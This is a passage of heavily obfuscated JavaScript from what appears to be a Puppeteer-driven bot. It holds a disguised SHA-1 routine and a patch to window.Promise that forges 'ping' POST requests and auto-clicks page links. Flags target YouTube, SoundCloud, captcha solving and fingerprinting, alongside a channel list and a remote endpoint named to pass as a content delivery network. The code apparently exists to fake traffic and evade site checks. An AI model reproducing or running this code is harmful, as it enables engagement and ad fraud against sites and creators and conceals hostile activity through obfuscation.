0x49 | 0x463 * -0x7 + -0x354 * 0x1 + 0x2248 & L) << y[-0xcdb * 0x3 + 0x677 + 0x201d & N++]) : (L = 0x1cf41 * -0x1 + -0x1707a * 0x1 + 0x1 * 0x43fbb + ((-0x19 * -0xb8 + 0x5 * 0x77 + 0x7 * -0x254 & L) << -0x4 * 0xe3 + -0x1 * 0x28f + 0x625 | 0x3c2 + 0x2309 + -0x22cc & J['charCodeAt'](++M)), P[N >> 0x231 * 0xb + 0x1 * 0x1619 + 0xdb * -0x36] |= (0xb * -0x142 + 0x1 * 0xf43 + 0x7d * -0x1 | L >> 0xeb9 * -0x1 + 0x5e2 + 0x8e9) << y[0x197 * -0xb + 0x12 * -0x172 + 0xae1 * 0x4 & N++], P[N >> -0x2082 * -0x1 + 0x1 * -0x3ed + 0x4d * -0x5f] |= (-0x1f1f + 0x7d3 + 0x4 * 0x5f3 | L >> 0x1 * -0x1ae1 + 0x1 * 0x20eb + -0x5fe & -0x1926 * -0x1 + -0x1e81 + 0x1 * 0x59a) << y[0x2f1 + -0x12f2 + 0x1004 & N++], P[N >> -0x988 + -0x7ad + 0x1137] |= (0x1 * 0xfa1 + 0x1 * 0x173 + -0x1094 | L >> 0x1b66 + -0x13c4 + -0x79c & -0x1840 + -0x4db * -0x2 + -0x2f5 * -0x5) << y[-0x172f + 0x982 + 0x490 * 0x3 & N++], P[N >> 0x1f * 0x131 + 0x3 * -0xc8c + -0x3d * -0x3] |= (-0x8a8 + 0xcea + -0xd * 0x4a | 0x31b * 0x7 + 0x8 * -0x4a9 + -0x5e * -0x2b & L) << y[0x3 * 0x557 + -0x1fc3 + -0x25 * -0x6d & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xeb4 * 0x1 + -0xc5a + -0x21a ? (this['block'] = P[-0xf65 * -0x1 + 0x1085 * -0x1 + 0x130], this['start'] = N - (0xecf + 0x55c + 0x13eb * -0x1), this['hash'](), this['hashed'] = 0xc95 + 0x1fac + 0x2 * -0x1620) : this['start'] = N;
                }
                return this['bytes'] > 0xd2fce4f * 0x8 + -0x11c07312b + 0x1b288beb2 && (this['hBytes'] += this['bytes'] / (0xaf08b068 + -0x5221c49c * -0x3 + -0xa56dfe3c) << -0x8 * -0x3df + 0x1c73 + 0x1 * -0x3b6b, this['bytes'] = this['bytes'] % (-0xf7f4b1e * 0x1c + -0x2 * 0xcc96130a + 0x44b185d5c)), this;
              }
            }
            [Z(aR.f)]() {
              if (!this['finalized']) {
                this['finalized'] = -0x22d8 + 0x12d1 + 0x8 * 0x201;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x2681 + -0x1 * -0x257 + -0x28c8] = this['block'], J[K >> -0xc10 * -0x2 + 0x8b2 + 0x23 * -0xf0] |= x[-0x6d8 * -0x3 + 0x28e + 0x7b1 * -0x3 & K], this['block'] = J[0xb0c + -0x2195 + -0x1 * -0x1699], K >= 0x2 * 0x1f + -0x1e90 + -0xa2e * -0x3 && (this['hashed'] || this['hash'](), J[-0x1 * 0x1532 + 0x847 + 0xceb * 0x1] = this['block'], J[-0xbaf * -0x3 + -0x3 * -0xc13 + 0x239b * -0x2] = J[-0x2217 + -0x18 * -0x47 + 0x1b7 * 0x10] = J[-0x1bc2 + -0x8aa * 0x3 + -0x7 * -0x7ae] = J[0xea6 + 0xd * -0x6c + -0x927] = J[0x79 * 0x4c + -0x6d * 0x51 + -0x79 * 0x3] = J[-0x8c3 + -0x49 * -0x14 + 0x18a * 0x2] = J[-0x1520 + 0x1482 + 0xa4] = J[0x1 * -0x699 + -0x7 * -0x170 + 0x58 * -0xa] = J[0x1e8a + -0x1842 + -0x640] = J[0x8b6 + -0xaca * 0x1 + -0x21d * -0x1] = J[-0x11 * 0xaa + -0x2011 * -0x1 + -0x14bd] = J[0x10be * 0x1 + -0x13d6 * -0x1 + -0x2489] = J[0x14b9 + -0x1c3 + 0x12 * -0x10d] = J[-0x221d + 0x417 + -0x1 * -0x1e13] = J[-0x21df + 0x191 * -0x1 + 0x237e] = J[0xe11 + 0x2 * 0xf88 + 0x1 * -0x2d12] = -0xbc5 * 0x1 + 0x812 + 0x3b3), J[-0x1817 * -0x1 + -0x2356 * 0x1 + 0xb4d] = this['hBytes'] << -0x795 + 0x25d0 + -0x2 * 0xf1c | this['bytes'] >>> 0x17 * -0x18c + -0x5 * -0x13d + 0x1d80, J[0x1 * -0x1e0c + 0x1b * 0x5d + -0x6c4 * -0x3] = this['bytes'] << 0x25f7 + 0x1210 + -0x3804, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x6a0 + 0x16e * 0x4 + -0x106 * 0xc; J < 0xeff + 0x558 + -0x1407; ++J)
                K = Q[J - (-0x314 * -0xb + -0x2 * -0x11f0 + -0x45b9)] ^ Q[J - (-0xc * -0x1ef + 0x774 + -0xe0 * 0x23)] ^ Q[J - (0xf * 0x1c6 + 0x359 * -0x5 + 0x3 * -0x345)] ^ Q[J - (0x2 * 0xc5 + -0x21e9 + -0x1 * -0x206f)], Q[J] = K << 0x6 * -0x621 + -0x49 * 0x20 + 0x3 * 0xf4d | K >>> -0x1 * 0x1529 + 0x25f9 + 0x1 * -0x10b1;
              for (J = -0x149d + -0x25c6 + 0x3a63; J < -0xf * 0x141 + -0xb71 + 0xa1c * 0x3; J += 0x17 * -0x12e + -0x590 + 0x20b7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1a01 + -0x7db * -0x1 + -0x21d7 | L >>> 0x1cf4 + -0x1767 * -0x1 + -0x3440) + (M & N | ~M & O) + P + (0x3fdcb870 + -0x623b0d47 * -0x1 + 0x23caa60f * -0x2) + Q[J] << -0x137d + 0x19e7 + -0x66a) << -0x1f29 + 0xd45 * 0x1 + -0x23 * -0x83 | P >>> -0x1d22 + 0x1bc7 + -0x2 * -0xbb) + (L & (M = M << -0x1 * -0x1bf4 + 0x2335 + -0x3f0b | M >>> -0xc47 + -0x1 * -0xf7f + 0x1 * -0x336) | ~L & N) + O + (0x45 * 0x2535367 + -0x316a * 0x2105e + -0x12ae2 * -0x1b71) + Q[J + (0x1645 * 0x1 + 0x98a + -0x2 * 0xfe7)] << -0x16a0 + -0x462 + 0xd81 * 0x2) << -0x1b59 + 0x63e * -0x1 + 0x219c * 0x1 | O >>> -0x9ca + -0x1c4a + 0x11 * 0x23f) + (P & (L = L << 0x472 * 0x7 + -0x7 * -0x3e7 + -0x3a51 | L >>> 0xa6e + -0x22 * -0x119 + -0x2 * 0x17df) | ~P & M) + N + (0x39 * 0x17fb0d7 + -0x3eb2ad * 0x56 + 0x1a241fd8) + Q[J + (-0x1c91 + -0x1044 + 0x2cd7)] << 0x1 * 0x1467 + -0x1a9b + -0x2 * -0x31a) << 0x19c3 * 0x1 + -0xbd * -0x3 + 0x1a5 * -0x11 | N >>> 0x14cf + -0x1353 + -0x161) + (O & (P = P << -0x1 * -0x2669 + -0x1 * 0x2624 + 0x27 * -0x1 | P >>> -0x2079 + -0x1765 + 0x60 * 0x95) | ~O & L) + M + (-0x1d418a2 * 0x3b + 0x3343f5b * -0xa + 0xe66ea07d) + Q[J + (-0x7bd + -0x15 * -0x1c1 + -0x1d15)] << -0x1b82 + 0x1 * -0x19a5 + 0x1 * 0x3527) << -0x1 * 0x11e5 + 0x254d + -0x1363 | M >>> 0x782 * -0x5 + 0x53 * 0x5d + 0x77e) + (N & (O = O << -0xdff + 0x4 * -0x91a + 0x1df * 0x1b | O >>> -0x1288 + -0xaff + 0x1 * 0x1d89) | ~N & P) + L + (-0x8bef1549 + 0x6c90f960 + 0x79e09582) + Q[J + (0x116d + -0x1847 + -0x1 * -0x6de)] << 0x2 * 0xf03 + -0x124a + -0xbbc * 0x1, N = N << -0xb43 + -0x42 + 0xba3 | N >>> 0x2 * 0x5cb + -0x23b * -0x6 + -0x2d * 0x8e;
              for (; J < 0xb9b + -0x178 + 0x16d * -0x7; J += 0x4bd * -0x3 + 0x6c4 + 0x778)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2610 + -0x1ee9 * 0x1 + 0x44fe | L >>> 0x427 * 0x5 + 0x1e0e + -0x195b * 0x2) + (M ^ N ^ O) + P + (-0x194 * 0x6d53ca + 0x95ca861 + -0x112057e08 * -0x1) + Q[J] << -0x24 * -0x8 + -0xd43 + 0xc23) << -0x1c * -0xda + 0x1596 + 0x5d * -0x7d | P >>> 0x7 * -0x308 + 0x19e * -0x2 + 0x188f * 0x1) + (L ^ (M = M << 0x1 * 0x14ae + -0x737 * 0x2 + -0x622 | M >>> -0x1d8a + -0x6d * 0x3a + 0x2 * 0x1b1f) ^ N) + O + (0x7 * 0x475a549 + -0xf * -0x992766d + -0x3ff289c1) + Q[J + (-0xeb4 + 0xbc4 * -0x1 + 0x1a79)] << -0x1f * 0xd + 0x2 * -0xe75 + 0x619 * 0x5) << 0x2064 + -0x62f * -0x3 + -0x32ec * 0x1 | O >>> 0x1 * 0x1a2f + 0x1e8e + 0x293 * -0x16) + (P ^ (L = L << -0xfa5 + 0xbd * -0x8 + 0x15ab | L >>> 0xddf * 0x2 + 0x1 * 0x2303 + 0x1 * -0x3ebf) ^ M) + N + (-0xe26f * 0xc259 + -0x38 * -0x342398a + 0x64442c08) + Q[J + (0x1fa6 + 0x1a * -0xe9 + -0x7fa)] << 0x12b * -0xb + -0x3fd * 0x9 + -0x2 * -0x185f) << 0x180d * -0x1 + 0x227f * -0x1 + -0x3a91 * -0x1 | N >>> -0x6 * -0x58 + 0x2579 + -0x276e) + (O ^ (P = P << 0x94f * 0x4 + 0x2 * -0x1bb + -0x21a8 | P >>> -0x105a + -0xd9 * -0x3 + 0xdd1) ^ L) + M + (0x8017a53d + 0xe9229b * 0x86 + 0x2d8e * -0x30ea9) + Q[J + (-0x25 * 0x1e + 0xb1 * -0x2f + 0x24d8)] << -0x2 * 0x124 + 0x2 * 0x11d2 + -0x215c) << 0x2 * 0x811 + -0x3 + -0x101a | M >>> -0x1f5 * -0xa + -0x1c9b + 0xa * 0xea) + (N ^ (O = O << 0x19d5 + 0x2268 + -0x1 * 0x3c1f | O >>> 0x8cd + 0x1 * 0xdda + 0x11 * -0x155) ^ P) + L + (-0x8a137734 + 0x2e66d33f + 0x63e * 0x2071d5) + Q[J + (-0x3 * -0x19b + -0x1be3 * 0x1 + 0x1716)] << 0x7c7 + 0x5d * 0x3d + -0x1df0 * 0x1, N = N << 0xb * 0x335 + 0x3 * -0x54f + 0x4cf * -0x4 | N >>> 0x1154 + 0x28f * 0x5 + 0x251 * -0xd;
              for (; J < 0xd0 * -0x2f + 0xb55 * -0x1 + 0x31c1; J += -0x3 * 0x9d7 + 0x1845 + 0x1 * 0x545)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x183b * 0x1 + 0xd2d * 0x1 + 0xb13 | L >>> 0x1217 + -0x22d4 + 0x1c * 0x9a) + (M & N | M & O | N & O) + P - (-0x5b56eacd * 0x2 + -0x29 * -0x315290b + 0xa92e85fb) + Q[J] << -0x2 * -0x7ed + 0x1 * -0x836 + -0x7a4) << 0x1fe2 + 0x1fe2 + 0x3fbf * -0x1 | P >>> 0x2237 + -0xcb6 + -0x1566) + (L & (M = M << 0x10 * -0x52 + 0x1b12 + -0x15d4 | M >>> -0x46f * -0x2 + 0xe8 * 0x2b + -0x2fd4) | L & N | M & N) + O - (0xbb4e347 + 0x6dc1c01f + -0x8926042) + Q[J + (0x21af + -0x1228 + -0xf86)] << 0x1a0f + 0x81 * 0x20 + 0x1 * -0x2a2f) << -0x1381 + 0x19d9 + -0x653 | O >>> -0xe41 * 0x1 + -0xa * 0x3ad + 0x331e) + (P & (L = L << -0x1 * 0xcc5 + 0x1fe8 + 0x21d * -0x9 | L >>> -0xfd1 * 0x1 + -0x2 * -0x1c1 + -0xc51 * -0x1) | P & M | L & M) + N - (0x1 * 0x35d6455f + -0x2d0cbcab + -0x8 * -0xd03574e) + Q[J + (-0x15 * -0xb1 + 0x1ba3 + -0x2a26)] << 0x25af + 0x34d + -0x28fc) << 0x1645 + 0x1dd2 * -0x1 + 0x792 | N >>> -0x1009 * -0x1 + 0x41c * 0x2 + -0xc13 * 0x2) + (O & (P = P << 0x14f9 + -0x97e + 0x1 * -0xb5d | P >>> 0x1 * 0x55b + 0x202e * -0x1 + 0x1ad5) | O & L | P & L) + M - (-0x24fdbb2 * 0x38 + -0x8afeadc7 + 0x17d5affdb) + Q[J + (0x1b * -0xa7 + -0x1 * -0x240c + -0x936 * 0x2)] << 0x1048 + -0x15b + -0xeed) << -0x4 * 0x994 + -0x1bfd * 0x1 + 0x51a * 0xd | M >>> 0x167c + 0x251 * -0x9 + -0x188) + (N & (O = O << -0x1c82 + 0x55f * 0x3 + 0xc83 | O >>> 0x95 * 0x8 + 0x603 * -0x3 + 0xd63) | N & P | O & P) + L - (0x5 * -0x37270d3 + 0x5bba457f * 0x1 + -0x76 * -0x534e86) + Q[J + (-0x13d * -0x1 + -0x1114 + -0x63 * -0x29)] << -0x2210 + 0x21 + 0x4d9 * 0x7, N = N << 0x14f + -0x1684 + 0x1553 | N >>> -0xfb * 0x1 + -0x17f4 + 0x5 * 0x4fd;
              for (; J < 0x115 * 0x15 + 0x54 * 0x57 + -0xa31 * 0x5; J += 0x1d * 0xf4 + -0x2011 * -0x1 + 0x4 * -0xeec)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x60a * 0x1 + -0x1402 + 0x1 * 0xdfd | L >>> 0x38 * -0x43 + -0x13b8 + 0x5b * 0x61) + (M ^ N ^ O) + P - (0x61765734 + 0x577 * 0x49a87 + -0x17008599 * 0x3) + Q[J] << -0x4eb * 0x1 + 0xdee * 0x1 + -0x903) << -0xdd9 + 0x24aa + -0x16cc | P >>> 0x1edb + -0x8bd * -0x4 + -0x2 * 0x20da) + (L ^ (M = M << 0x735 * 0x1 + 0x2531 * -0x1 + 0x1 * 0x1e1a | M >>> 0x389 * 0x1 + -0x1f5 * 0xc + 0x13f5) ^ N) + O - (-0x3d4ebcec + 0x690d9500 + 0x28bf95 * 0x3e) + Q[J + (-0x1f80 + -0x2 * 0x2b7 + 0x24ef)] << -0x235f + 0x24fc + 0x3b * -0x7) << 0x379 * 0x3 + 0x161 * -0x1 + -0x905 | O >>> 0xb * -0x34b + -0xf7e + -0x33d2 * -0x1) + (P ^ (L = L << -0x13a * 0x8 + -0x10ac * -0x1 + -0x6be | L >>> -0x1e4e + 0x1 * -0x1dcd + 0x3c1d) ^ M) + N - (-0x103 * 0x39d8f5 + 0x59 * -0x5d4a8a + -0xb * -0xd249ae9) + Q[J + (0x242 * -0xf + 0xa1 * 0x11 + 0x4a3 * 0x5)] << -0x15e8 * 0x1 + 0x170f + 0x3b * -0x5) << 0x21 * 0x97 + 0x225e * -0x1 + 0xeec | N >>> -0xef5 + -0x1c99 + 0x2ba9 * 0x1) + (O ^ (P = P << -0x11b0 * 0x2 + 0x13 * 0x119 + 0x3 * 0x4e1 | P >>> -0x157d * -0x1 + -0x21ad + 0x619 * 0x2) ^ L) + M - (0xe * -0x1f02391 + -0x4132 * -0x15427 + -0x5e12686) + Q[J + (0x127e + 0x320 + -0x159b)] << -0x2234 + 0x1920 + 0xa6 * 0xe) << 0x1cf3 * -0x1 + -0x26fb + 0x43f3 | M >>> 0xb * -0xd1 + 0x2679 + -0x1d63) + (N ^ (O = O << -0x1ab + -0x1 * 0xbec + 0xdb5 | O >>> 0x5 * -0x29d + -0x2440 + 0x3d * 0xcf) ^ P) + L - (-0x1 * -0x430fccd8 + -0x31 * -0xa476fe + -0x2ced554c) + Q[J + (-0x3 * 0xb9b + -0x1e4d * 0x1 + 0x31a * 0x15)] << -0x1 * 0x1699 + 0x18b * -0x13 + 0x33ea, N = N << -0x197 * 0xd + -0x5 * -0x8b + -0x9 * -0x202 | N >>> 0x1f83 + 0x22c7 + -0x849 * 0x8;
              this['h0'] = this['h0'] + L << -0xc4d * 0x1 + 0x1120 * -0x1 + 0x5d * 0x51, this['h1'] = this['h1'] + M << -0x279 * -0x7 + 0x1d + -0x116c, this['h2'] = this['h2'] + N << 0xe * -0x1ad + -0x1892 + 0x3008, this['h3'] = this['h3'] + O << -0x257 * -0xe + -0x11c3 + -0xeff, this['h4'] = this['h4'] + P << 0x16a9 + -0x1f5 + -0x14b4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xe * -0x19 + -0x9 * -0x2f6 + -0x1be8 * 0x1 & -0x1e6c + -0x17d3 + 0x364e] + w[J >> -0x13 * 0x48 + 0x3 * -0xb5d + 0x2787 & 0x1ded + 0x2000 + -0x2 * 0x1eef] + w[J >> 0x2365 + -0x90a + -0xd9 * 0x1f & -0x1 * 0x1c29 + -0xbd5 * -0x2 + 0x48e] + w[J >> 0x56 * -0x1e + 0x17f * -0x3 + 0x217 * 0x7 & 0xcf1 * 0x1 + 0x1a * -0x10a + 0xe22] + w[J >> 0x269 + 0x29 * -0x6d + 0xf18 & 0x231 + 0x10e4 + -0x1306] + w[J >> 0x435 * 0x9 + 0x2 * 0xc19 + -0x3e07 & 0x19de + 0x20b9 + -0x3a88] + w[J >> -0x213c + -0x5 * 0x17 + 0x21b3 * 0x1 & -0x193d + -0x1 * 0x1075 + 0x29c1] + w[-0x1b39 + 0x41d + 0x172b & J] + w[K >> -0x2464 * -0x1 + 0x45 * -0x4f + -0xefd * 0x1 & -0x919 + 0x1d63 + -0x143b * 0x1] + w[K >> 0x29d * 0x4 + -0x1de8 + 0x138c & 0x22e3 + 0xba3 + -0x2e77] + w[K >> 0xa1a + 0x2c * -0x9a + -0x2 * -0x839 & -0x1480 + -0x4 * 0x6c4 + 0x2f9f * 0x1] + w[K >> 0x8 * 0x85 + 0x26c8 + -0x1c * 0x188 & 0x3 * 0x439 + -0x2a6 * 0xd + 0x126 * 0x13] + w[K >> 0x848 + -0x20b * 0xe + 0x145e & 0x25b3 + -0x13b7 + -0x11ed * 0x1] + w[K >> -0x13 * -0x53 + 0x9f7 + -0x1018 & 0x141 * 0x4 + -0x23 * -0x19 + 0x10 * -0x86] + w[K >> 0x1 * 0x210c + -0x161 * -0x9 + -0x2d71 & -0x8c3 + 0x98f + -0xbd] + w[-0x126d + -0x5 * 0x1c3 + 0x3 * 0x919 & K] + w[L >> -0x1098 + 0x175 * -0x2 + 0xa2 * 0x1f & 0x4dc * 0x5 + 0x23b5 * 0x1 + -0x3bf2] + w[L >> -0x4 * 0x28c + 0xf9 * -0x3 + -0x1f * -0x6d & -0x2 * 0xf55 + 0x5ed * -0x1 + -0x1 * -0x24a6] + w[L >> 0x1 * 0x17f8 + -0x21 + -0x17c3 & 0x1 * 0xf69 + -0xe47 + -0x113] + w[L >> 0x1 * 0x1589 + -0x2cb + -0x12ae & -0x7 * 0x2e7 + -0x79e + 0x1bfe] + w[L >> 0x61e + -0x1aad + 0x149b & 0x5 * 0x518 + -0x9cf + -0xf9a] + w[L >> -0x146 * -0x1b + 0xc67 * 0x1 + -0x2ec1 & -0xfd + 0x121f * 0x1 + -0x1113] + w[L >> 0xaca + -0x223 * 0x8 + 0x652 * 0x1 & -0x16f1 * 0x1 + -0x9f8 * -0x1 + 0xd08] + w[0x9d5 + 0x1 * 0x939 + 0x3 * -0x655 & L] + w[M >> -0x1 * 0x7b9 + -0xeac * 0x2 + 0x1 * 0x252d & -0xff + -0x9c9 + 0xf * 0xb9] + w[M >> 0x19d * 0x6 + -0xe3 + -0x83 * 0x11 & -0xd10 + -0x38b + -0x9e * -0x1b] + w[M >> 0x60d * -0x5 + -0x20d2 + -0x11 * -0x3b7 & -0x59 * -0x59 + 0x905 * -0x1 + 0x15dd * -0x1] + w[M >> -0x151 + 0x64d + 0x2d * -0x1c & -0xa1 * 0x2 + 0xb2a + -0x9d9] + w[M >> -0x18f9 + 0x1df3 + -0x4ee & 0xe23 + -0x192 + -0x2 * 0x641] + w[M >> 0x1 * 0x1e9e + -0x1 * 0x1d3c + -0xad * 0x2 & 0x3 * -0xabd + -0x3f0 + 0x2436] + w[M >> 0x371 * 0x9 + 0x11f * -0x1b + -0x10 * 0xb & -0x252a + 0x463 * -0x1 + 0x14ce * 0x2] + w[-0xdc5 + 0x1d45 + -0xf71 & M] + w[N >> -0x228d + 0xbae + -0x16fb * -0x1 & 0x2334 + -0x78c + 0x311 * -0x9] + w[N >> 0x7da + -0x1 * -0x26d2 + 0x4 * -0xba5 & -0x283 + -0x2096 + 0x2328] + w[N >> 0x1765 + -0x602 * 0x1 + 0x7 * -0x279 & 0xcd5 + 0x9 * 0x1e2 + -0x1db8] + w[N >> -0x20c * 0xa + 0x1ccc + 0x422 * -0x2 & -0x1 * 0x18cb + 0x2043 * 0x1 + 0x10f * -0x7] + w[N >> -0x25 + -0xd59 + 0xd8a & 0xc29 + 0x2 * -0x65a + -0x7 * -0x16] + w[N >> 0xb1 * 0x2 + 0x1 * 0x2113 + -0x226d & -0x233b + 0xb51 * -0x2 + -0x2 * -0x1cf6] + w[N >> -0x2021 + 0x83d + 0x18 * 0xff & 0x23d * 0x5 + -0xff1 + 0x4cf] + w[0x1afa + -0x5f5 + -0x2 * 0xa7b & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1a0d + -0x1a * -0x12 + 0xf9 * 0x19 & 0x1db * 0xd + 0x9ea + -0x1 * 0x210a,
                J >> 0xe1f * 0x1 + 0x139a + -0x21a9 & 0xeff + 0x6b6 + -0x14b6,
                J >> 0x1fc7 + -0x1 * 0xe17 + -0x8 * 0x235 & 0x2b6 + -0xe17 + -0xb0 * -0x12,
                0x1fff * -0x1 + 0x28 * 0x1 + 0x20d6 & J,
                K >> -0x4e5 * -0x1 + 0x9 * 0x2a3 + -0x1c88 & -0xf49 + -0x213b + 0x3 * 0x1081,
                K >> -0xf24 + 0x9 * -0xcf + 0x167b & 0x1b83 * 0x1 + 0x148e + -0x2f12 * 0x1,
                K >> 0x23bb + -0x9 * -0x2e + -0xe9 * 0x29 & -0x2094 + 0x23d6 + -0x243 * 0x1,
                -0x196c + 0x5 * 0x70 + 0x1 * 0x183b & K,
                L >> -0x3b * -0x11 + -0x847 + 0x474 & -0xab8 + -0x15 * -0x12e + 0x1 * -0xd0f,
                L >> -0x322 * 0x6 + 0xda2 * 0x2 + 0x434 * -0x2 & -0x2 * -0x10 + -0x1873 + 0x1952,
                L >> -0x1a78 + 0x1e93 + -0x413 & 0x1 * 0x171f + -0x1579 + -0xa7,
                0x1 * -0x118a + 0x1f * -0x1b + -0x2 * -0xae7 & L,
                M >> 0x1465 * -0x1 + 0x6e * -0x4d + 0xd * 0x41f & -0x2ce + -0xdc3 + -0x10 * -0x119,
                M >> -0x1 * -0x1367 + 0xd03 * -0x3 + 0x13b2 & -0x1936 + 0x22ec + -0x8b7,
                M >> -0x18ce + -0x115b + -0x7 * -0x607 & 0x6a * -0x44 + -0x1 * -0x2105 + -0x3de,
                0x9 * 0x287 + -0x12 * -0x1f1 + -0x1c59 * 0x2 & M,
                N >> 0x30d + 0x18fd * 0x1 + -0x1bf2 & -0x1617 + 0x1ace + -0x3b8,
                N >> -0xb58 + 0x106a + 0x281 * -0x2 & -0x1b03 + -0x1 * -0x24dd + -0x8db,
                N >> 0x8f5 * 0x1 + 0x1be5 + -0x24d2 * 0x1 & -0x7a0 + 0x1abf + -0x2 * 0x910,
                0x1fb1 + 0x7 * 0x11 + -0x1f29 * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xa9 * 0x17 + -0x1c04 + 0xce9), (K = new DataView(J))['setUint32'](-0x220a * 0x1 + 0x1d91 + 0x479, this['h0']), K['setUint32'](-0x132 * 0x6 + -0x1d12 + -0x111 * -0x22, this['h1']), K['setUint32'](0x1357 + -0x2474 + 0x1125, this['h2']), K['setUint32'](-0x97d + 0x2d4 + -0x65 * -0x11, this['h3']), K['setUint32'](-0x4a5 * -0x4 + 0x1cf8 * 0x1 + -0x2f7c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me'](a0(0x19) + 'nk')[0x8 * 0xbc + 0xcfb * 0x2 + -0x1fd6];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x125 * 0xb + 0x861 + -0x14f8;
            J[0x12a8 + -0xaa * 0x31 + 0xde2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x26ab + -0x1 * -0x454 + 0x4c7 * -0x9] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x954 + -0x1 * 0x20b + -0x748), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x15b1 * -0x1 + -0x110f + 0x26c1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x122e * -0x2 + -0xe6e + -0x1012), Promise['resolve'](0x22 * 0xfb + 0x88 * -0x44 + 0x2cb);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x135 + -0x1cfa + -0x1bc5 * -0x1; j < 0x11eb + 0xf * 0x25 + -0x1415; j++)
    i();
}
const NETWORK_PATIENCE = -0x33b * 0x7 + -0x1 * -0x10d + 0x34d0 + (0x2 * -0x213 + -0x1aff + 0x2add) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x259b + 0xc00 + 0x1 * 0x199e) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + a1(0x18) + 'st',
    'https://ww' + 'w.youtube.' + a2(0x6, '68rN') + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + a1(0x11) + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + a3(0x1d) + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1e * -0x8 + -0xf82 + 0xe92; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
